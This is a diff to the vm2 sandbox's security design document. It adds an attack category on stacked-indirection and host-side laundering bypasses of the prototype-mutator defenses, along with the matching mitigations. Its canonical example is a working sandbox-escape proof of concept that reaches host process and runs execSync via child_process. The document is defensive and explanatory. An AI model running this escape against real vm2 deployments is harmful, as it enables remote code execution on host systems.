@@ -2497,7 +2497,7 @@ We deliberately do **not** wrap on the proto-walk fall-through paths (null proto
 
 - **Sandbox-realm `Object.setPrototypeOf` / `Reflect.setPrototypeOf` on sandbox values** — not in the dangerous-mutator set (only host-realm copies are). Sandbox code can still mutate its own prototypes freely.
 - **`__proto__` *getter* (read-only)** — not blocked. Reading a host prototype is not, by itself, a privilege-escalation primitive, and blocking the getter would break legitimate `instanceof` and inspection paths. The attack requires *writing*, which is what the dangerous-mutator set covers.
-- **Deeper indirection** (`Function.prototype.call.call.call(...)`) — V8 collapses these at the spec level. The apply trap's `object` is always the outermost `Function.prototype.call`, and `context` is the next-inner reference. Depth-1 peel is sufficient.
+- **Deeper indirection** (`Function.prototype.call.call.call(...)`) — depth-1 peel is **not** sufficient. See [Category 37](#attack-category-37-stacked-indirection-bypass-of-host-prototype-mutator-peel). The structural fix is delivery-time refusal in `thisFromOtherWithFactory` / `thisFromOtherForThrow` / `thisEnsureThis` so the sandbox never holds a callable reference to a host prototype mutator regardless of how many indirection wrappers it stacks.
 - **`Function.prototype.bind` returning a new function** — bound functions don't immediately apply; they're invoked later. When the bound function is eventually applied, the apply trap fires again with the bound function as `object`. The bound function unwraps to a host-realm "bound function exotic object" rather than the original target, so the simple identity check on the bound function's identity wouldn't hit. However, sandbox-controllable bind paths reaching a dangerous mutator can be tested adversarially; if a bypass surfaces, the peel should be extended.
 - **Symbol-based "private" setter slots** — not known to exist for prototype mutation. The defense covers the documented set of mutators.
 
@@ -3086,6 +3086,154 @@ A non-iterable **array-like whose `length` is a toggling accessor** (`new Uint8A
 
 ---
 
+## Attack Category 37: Stacked Indirection Bypass of Host Prototype Mutator Peel
+
+**Uses**: [Category 30: Host Prototype Mutation via Bridged Setter Primitives](#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives).
+
+**Supersedes**: extends [Category 30](#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives) — the depth-1 indirection peel introduced there is the bypass surface.
+
+### Description
+
+The GHSA-v6mx-mf47-r5wg fix added an apply-trap guard that peels **one** layer of `Function.prototype.call` / `Function.prototype.apply` / `Function.prototype.bind` / `Reflect.apply` / `Reflect.construct` indirection: when the apply target is one of those primitives, the trap unwraps `context` (or `args[0]` for `Reflect.apply`) and checks the underlying function against `dangerousHostProtoMutators`. An attacker who stacks **two** layers of indirection defeats that peel because the peel inspects only one position. PoC:
+
+```javascript
+// (advisory GHSA-cfcw-xp6x-25gj)
+Buffer.call.call(Buffer.call, setProto, target, null);
+```
+
+In the bridge apply trap this surfaces as:
+
+- `object` = host `Function.prototype.call` (outer `.call`)
+- `context` = host `Function.prototype.call` (the receiver `Buffer.call`)
+- `args` = `[setProto, target, null]`
+
+The depth-1 peel unwraps `context` → `Function.prototype.call`, which is itself an indirection primitive and **not** in the dangerous-mutator set. The check passes; V8 unfolds the chain inside a single host call without re-entering the apply trap; the inner `Function.prototype.call` invokes `setProto.[[Call]](target, [null])`, severing the host prototype as in Category 30. Once the prototype is severed, the canonical `e.constructor.constructor` pivot to host `Function` works.
+
+CWE-913 (Improper Control of Dynamically-Managed Code Resources).
+
+### Attack Flow
+
+1. Obtain references to host `Object.prototype.__proto__` accessor: `setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__")`, `getProto` analogously.
+2. Trigger a host-realm rejection (`await WebAssembly.compileStreaming()`).
+3. In `catch (e)`, sever the host prototype via the **double-indirection** form: `Buffer.call.call(Buffer.call, setProto, getProtoOf(e), null)`. The depth-1 v6mx peel sees only `Function.prototype.call` as the underlying and allows the call through.
+4. Trigger a second host-realm rejection. The bridge's read-side defense (Category 30 Layer B — cache check in `thisEnsureThis`) catches values previously crossed via the bridge, but the freshly-thrown host `TypeError` has not crossed yet; with its prototype chain severed, the proto-walk falls through and `ensureThis` returns the raw host value.
+5. `e.constructor.constructor` → host `Function` → `new HostFunction("return process")()` → RCE.
+
+### Canonical Example
+
+```javascript
+// (advisory GHSA-cfcw-xp6x-25gj)
+const { VM } = require("vm2");
+const vm = new VM();
+vm.run(`
+  const getProto = Buffer.call.call(Buffer.call, {}.__lookupGetter__, Buffer, "__proto__");
+  const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__");
+  async function f() {
+    try { await WebAssembly.compileStreaming(); }
+    catch(e) {
+      Buffer.call.call(Buffer.call, setProto,
+        Buffer.call.call(Buffer.call, getProto, e), null);
+    }
+    try { await WebAssembly.compileStreaming(); }
+    catch(e) {
+      e.constructor.constructor("return process")()
+        .mainModule.require('child_process').execSync('touch pwned');
+    }
+  }
+  f();
+`);
+```
+
+### Why It Works
+
+The v6mx peel is positional: it inspects exactly one layer of indirection (`object` is `F.p.call`, look at `context`). A second layer pushes the dangerous function out of that position — `context` is now `F.p.call`, and the dangerous function is in `args[0]`. V8's spec for `F.p.call.[[Call]](thisArg, args)` is `thisArg.[[Call]](args[0], args.slice(1))`, so a chain of N `.call`s consumes N arguments before reaching the actual function — and V8 unfolds the chain inside a single host call without re-entering any sandbox proxy trap.
+
+Adding deeper positional peeling would be an arms race: 3-layer (`F.p.call.call.call(...)`), mixed `.call`/`.apply`/`Reflect.apply`, and `.bind`-then-invoke chains all need their own positional handling. The structural answer is to deny the **reference**, not the **invocation**: refuse to ever deliver a callable host prototype mutator into the sandbox, so no number of indirection wrappers can resurrect the primitive.
+
+### Mitigation
+
+**Structural fix in `lib/bridge.js`** — refuse to deliver any raw host prototype mutator across the bridge at any of the three value-crossing chokepoints. The dangerous-mutator set is already populated at bridge init by the v6mx fix; this category extends its use from "invocation check" to "delivery check":
+
+- `thisFromOtherWithFactory` — the main host→sandbox value path. Apply-trap return values, `get`-trap property reads, `getOwnPropertyDescriptor` `.set`/`.get` projections, and iterator yields all funnel through here.
+- `thisFromOtherForThrow` — host throw values delivered into sandbox catch blocks.
+- `thisEnsureThis` — `this`-coercion / catch-binding re-entry path.
+
+In each, **after** the `mappingOtherToThis` cache check, return `emptyFrozenObject` if `other` matches `isDangerousHostProtoMutator`:
+
+```javascript
+if (!isHost && isDangerousHostProtoMutator(other)) {
+  return emptyFrozenObject;
+}
+```
+
+This mirrors the existing handling for dangerous Function constructors (`isDangerousFunctionConstructor`) in the same chokepoints. The cache-check ordering is critical: `connect()` already registered safe sandbox-realm surrogates for `Object.prototype.__defineGetter__` / `__defineSetter__` (see `localObject.prototype.__defineGetter__` etc. in `lib/setup-sandbox.js`). A cache hit returns the surrogate, preserving the legitimate sandbox API. Only the **uncached, raw host references** — exactly what the attacker needs — are filtered.
+
+After this fix:
+
+- `const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__")` assigns `emptyFrozenObject` (the host setter never crosses the bridge).
+- Any subsequent `setProto.call(...)`, `setProto.apply(...)`, `setProto.bind(...)`, or `Reflect.apply(setProto, ...)` synchronously throws `TypeError: setProto.call is not a function` — the sandbox cannot apply a non-callable through any number of indirection wrappers.
+- N-layer indirection, mixed `.call`/`.apply`/`.bind`/`Reflect.apply`, future built-ins that act as `.call` substitutes, and descriptor-projection reads all collapse at the same upstream filter. The root primitive — holding a reference — is gone.
+
+The v6mx apply-trap peel remains in place as a complementary invocation-side check. The two layers (delivery refusal + apply-trap refusal) cover both "sandbox holds the reference and tries to apply it" and "sandbox somehow acquires the reference through a path that bypasses delivery". This restores **[Defense Invariant #1](#defense-invariants)** ("Never expose host constructors or prototypes") at the value-crossing chokepoint rather than at the call-site, eliminating positional dependency.
+
+### Detection Rules
+
+- **Sandbox reads any property whose value would be a host prototype mutator** — `Reflect.getOwnPropertyDescriptor`, `Object.getOwnPropertyDescriptors`, `__lookupSetter__`, `__lookupGetter__` results, descriptor `.set`/`.get` projections. All funnel through `thisFromOtherWithFactory`.
+- **Sandbox catches a host throw value that resolves to a host prototype mutator** — covered by `thisFromOtherForThrow`.
+- **Sandbox catch-binding re-entry with a host prototype mutator** — covered by `thisEnsureThis`.
+- **Sandbox calls `({}).__lookupSetter__('__proto__')` or `({}).__lookupGetter__('__proto__')` and assigns the result** — the result is now `emptyFrozenObject`, not the host accessor. Detection: assignment value is `Object.isFrozen(x) && Object.keys(x).length === 0 && typeof x !== 'function'`.
+
+### Considered Attack Surfaces
+
+- **Future indirection primitives** — any host built-in that V8 might add later, or that a Node version surfaces, that transitively invokes a function on its `this`. The delivery filter is layer-count and primitive-name independent; the underlying reference never crosses into the sandbox.
+- **Apply-trap target/context confusion** — if a future bug lets sandbox code reach the apply trap with the dangerous mutator as `args[0]` for a non-`Reflect.apply` target (e.g., a new `Function.prototype.applyN`), the v6mx peel would not match. The delivery filter does not depend on target-vs-context positioning, so this composition is also closed.
+- **`Object.setPrototypeOf` on sandbox-realm targets** — not in the dangerous-mutator set (only host-realm copies are). Sandbox code can still mutate its own prototypes freely via the sandbox-realm `Object.setPrototypeOf`, which is a different function identity from the host's.
+- **`Object.defineProperty` on sandbox-realm targets** — same reasoning. Sandbox-realm `Object.defineProperty` continues to work normally.
+- **`__defineGetter__` / `__defineSetter__` on sandbox objects** — the `connect()`-registered sandbox surrogates are returned via the `mappingOtherToThis` cache hit before the filter fires. Preserves the issue #176 regression behavior.
+
+### Related Categories
+
+- [Category 30: Host Prototype Mutation via Bridged Setter Primitives](#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives) — direct ancestor. v6mx introduced the dangerous-mutator set and the depth-1 apply-trap peel; this category extends the same set's use to delivery refusal.
+- [Category 26: Sandbox-Realm Null-Proto via Bridge `from()` Set-Trap Write-Through](#attack-category-26-sandbox-realm-null-proto-via-bridge-from--set-trap-write-through) — explains why the cache-check must come first in each chokepoint (sandbox-realm surrogates are returned by the cache hit before the filter applies).
+
+### Follow-Up Bypass: Host-Side Laundering via `bind` + Host Higher-Order Method (GHSA-cfcw-xp6x-25gj, 2026-05-25)
+
+The delivery-refusal and apply-trap-peel defenses above are both **identity-based**: they recognize the host indirection primitives (`Function.prototype.{call,apply,bind}`, `Reflect.{apply,construct}`) and the host prototype mutators by reference. The reporter defeated both by never holding the dangerous reference as a sandbox value and never re-crossing the bridge during the dangerous invocation:
+
+```javascript
+// (advisory GHSA-cfcw-xp6x-25gj, follow-up)
+const ca = Buffer.call.call(Buffer.bind, Buffer.apply, Buffer.call, Buffer.call);
+// ca === host Function.prototype.apply.bind(call, call) — a FRESH host function
+// identity, in NEITHER applyIndirectionPrimitives NOR dangerousHostProtoMutators.
+function caar(a){ const r = Buffer.of().toJSON().data; r[0] = a; return r.map(ca); }
+// r is a GENUINE host array; r.map(ca) runs host Array.prototype.map, which calls
+// the host ca callback host-side. __lookupSetter__ and the __proto__ setter run
+// entirely in the host realm — ZERO bridge crossings to inspect.
+async function f() {
+  try { await WebAssembly.compileStreaming(); }
+  catch (e) {
+    const g = caar([{}.__lookupGetter__, Buffer, "__proto__"]); g[1] = e;
+    const s = caar([{}.__lookupSetter__, Buffer, "__proto__"]); s[1] = ca(g); s[2] = null;
+    ca(s);                          // severs the host error prototype chain, host-side
+  }
+  try { await WebAssembly.compileStreaming(); }
+  catch (e) { e.constructor.constructor("return process")()...; }
+}
+```
+
+**Why it works:** `Function.prototype.bind` mints a *fresh* host function identity (`ca`) that bakes the indirection internally, so neither identity set matches it. Seeding a genuine host array (`Buffer.of().toJSON().data`) and invoking host `Array.prototype.map(ca)` runs the host applicator **host-side** — the dangerous `__proto__` setter executes in the host realm with no bridge apply trap on the path. Instrumenting the apply trap shows **zero** host applies of any dangerous/indirection primitive: the whole chain is laundered host-side. Both prior defenses inspect values *crossing* the bridge; this composes entirely *around* the bridge. The severed host error then surfaces in the second `catch`, where `e.constructor.constructor` reaches host `Function`.
+
+**Mitigation — mechanism-independent payoff hardening.** Rather than chase the laundering mechanism (an arms race: `bind`-derivatives, then `Reflect.apply`-derivatives, then every host higher-order method), close the **payoff**. The escape's terminal requirement is invariant across all severance mechanisms: a **raw host-realm object with a severed prototype chain must surface in sandbox code**. Two independent layers refuse exactly that:
+
+1. **`lib/bridge.js` `thisEnsureThis`** — the sole chokepoint that returns a host object *raw* on proto-walk fall-through (`thisFromOtherForThrow` and `thisFromOtherWithFactory` proxy instead). During the walk, track whether the chain passes through the sandbox `Object.prototype` (`thisObjectPrototype`). Every genuine sandbox-realm value's chain terminates there; a severed host object walks to `null` without ever seeing it. On fall-through, if `!sawSandboxObjectProto`, return `emptyFrozenObject`.
+2. **`lib/setup-sandbox.js` `handleException`** — the sole sanitizer the transformer routes every caught value through. `isForeignSeveredHostValue(e)` applies the same discriminator (chain reaches `null` without hitting the sandbox `Object.prototype`, captured at module load and unforgeable from inside the sandbox); if true, replace the value with a benign sandbox `Error`. Primordial `Object.create(null)` values (immediate null proto) are explicitly exempt, preserving GHSA-9vg3 behavior.
+
+Both layers are **mechanism-independent** — they do not care *how* the chain was severed (direct bridge call, stacked indirection, or fully host-side `bind`/`map` laundering), only that the result is a foreign severed host object. Either layer alone blocks the escape; they sit at independent chokepoints (bridge re-entry vs. transformer catch sanitizer). The discriminator is sound because the raw sandbox `Object.prototype` only exists in the sandbox realm — host-side code can never hold it (it crosses the bridge as a proxy), so a host object's chain can never falsely appear to pass through it. This restores **[Defense Invariant #1](#defense-invariants)** ("Never expose host constructors or prototypes") at the *payoff* — the universal `e.constructor.constructor === host.Function` pivot — independent of the delivery or invocation mechanism, and **supersedes** the positional v6mx peel and the identity-based delivery refusal for the severance-payoff class (both retained as complementary earlier-layer defenses).
+
+A rejected alternative was tracking `bind`-derivatives of the applicators in the apply trap (refuse any `bind`-of-an-applicator as call target/`this`/argument). It blocks the laundering earlier but is mechanism-specific (a novel host-side execution vector that does not use `bind`-of-applicator would slip), higher-collateral on legitimate `.call`/`.apply`/`.bind`, and unnecessary given the payoff hardening already closes the class.
+
+---
+
 ## Considered Attack Surfaces
 
 These attack surfaces were analyzed and found to be safe or low-risk. They are documented here so future reviewers do not re-investigate them.
@@ -3215,6 +3363,8 @@ The most dangerous attacks combine multiple categories. Each pattern references 
 | Internal state probe via computed property access on `globalThis` (GHSA-2cm2-m3w5-gp2f) | Bootstrap script declares `let VM2_INTERNAL_STATE_…` at script-top so the binding lands in the context's `[[GlobalLexicalEnvironment]]`; transformer-emitted `${INTERNAL_STATE_NAME}.handleException(…)` resolves there as before, but `globalThis[k]`, `Reflect.get`, descriptor APIs, and own-property enumeration cannot reach it (the global object's own-key table no longer contains the entry). Supersedes the identifier-only mitigation of GHSA-wp5r-2gw5-m7q7 by closing the entire computed-key class structurally. |
 | Bridge-internal container via `Array.prototype[N]` setter (Category 28: GHSA-9qj6-qjgg-37qq Variant A + GHSA-q3fm-4wcw-g57x Variant B) | Variant A — `neutralizeArraySpeciesBatch` in `lib/bridge.js` writes saved entries via `thisReflectDefineProperty`; appended slot is an own data property and no sandbox-installed setter is invoked while the bridge holds raw saved state. Variant B — `defaultSandboxPrepareStackTrace` in `lib/setup-sandbox.js` accumulates frames in a string via primitive concatenation rather than an array, removing every reachable `Array.prototype` slot (index setter, getter, and `.join`); `makeCallSiteGetters` installs entries via `localReflectDefineProperty` for symmetry |
 | Host prototype mutation via apply trap (GHSA-v6mx-mf47-r5wg) | Apply trap caches the host prototype-mutating intrinsics (`Object.prototype.__proto__` setter, `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.{defineProperty,defineProperties}`, `Reflect.defineProperty`, `__defineSetter__`, `__defineGetter__`) in `dangerousHostProtoMutators` and refuses any invocation reaching them — direct or via one-layer indirection through `Function.prototype.{call,apply,bind}` / `Reflect.{apply,construct}`. Read-side defense-in-depth in `thisEnsureThis` cache-checks `mappingOtherToThis` before the proto-walk so any previously-bridged host value returns the existing proxy even when its prototype chain has been tampered with by some other route. |
+| Stacked indirection bypass of host prototype mutator peel (GHSA-cfcw-xp6x-25gj) | `thisFromOtherWithFactory`, `thisFromOtherForThrow`, and `thisEnsureThis` consult `isDangerousHostProtoMutator(other)` after the `mappingOtherToThis` cache check and return `emptyFrozenObject` for raw, uncached host references. The sandbox can no longer obtain a callable reference to a host prototype mutator regardless of how many `.call`/`.apply`/`.bind`/`Reflect.apply` indirection layers it stacks — the v6mx apply-trap peel remains as a complementary invocation-side check, but the structural class is closed at delivery time. Cache-first ordering preserves `connect()`-registered sandbox surrogates for `__defineGetter__`/`__defineSetter__` (issue #176). |
+| Host-side laundering of prototype severance via `bind` + host higher-order method (GHSA-cfcw-xp6x-25gj follow-up) | Mechanism-independent **payoff** hardening: a raw host-realm object whose prototype chain reaches `null` without passing through the sandbox `Object.prototype` is refused at two independent chokepoints — `thisEnsureThis` (the only path that returns a host object raw on proto-walk fall-through) returns `emptyFrozenObject`, and `handleException` (`isForeignSeveredHostValue`, the transformer's sole catch sanitizer) replaces it with a benign sandbox `Error`. Closes severance laundered entirely host-side (`apply.bind(call,call)` over a genuine host array's `.map`) that never re-crosses the bridge, independent of the severance mechanism. The sandbox `Object.prototype` is unforgeable host-side (it crosses as a proxy), so the discriminator cannot be spoofed. Primordial `Object.create(null)` values are exempt (GHSA-9vg3 preserved). |
 | Bridge `set` trap ignores spec `Receiver` (GHSA-c4cf-2hgv-2qv6) | `BaseHandler.set` gates host-write forwarding on `receiver === mappingOtherToThis.get(object)`; non-canonical receivers (inherited-receiver writes via `Object.create(proxy)`, forged-receiver `Reflect.set` calls, `Object.assign(child, src)` loops) install on `receiver` via `Reflect.defineProperty`, mirroring `ReadOnlyHandler.set` |
 | NodeVM builtin denylist bypass via `process` / `inspector/promises` (GHSA-rp36-8xq3-r6c4) | `DANGEROUS_BUILTINS` extended to include `process`; matching promoted to family-prefix via `isDangerousBuiltin(key)` so subpath builtins (`inspector/promises`, future `inspector/*`, `process/*`, `module/*`) share fate with their canonical name. `node:` URL prefix stripped before lookup. Enforced at both `BUILTIN_MODULES` source and `addDefaultBuiltin`. Supersedes the GHSA-947f-4v7f-x2v8 exact-match mitigation. |
 | NodeVM wildcard exposes underscored network builtins (GHSA-r9pm-gxmw-wv6p) | `BUILTIN_MODULES` filter in `lib/builtin.js` now excludes any name starting with `_`; `'*'` no longer expands to `_http_client`/`_http_server`/`_tls_wrap`/`_stream_*` etc. Explicit opt-in (`builtin: ['_http_client']`) and `mock`/`override` paths still work via `addDefaultBuiltin`. |
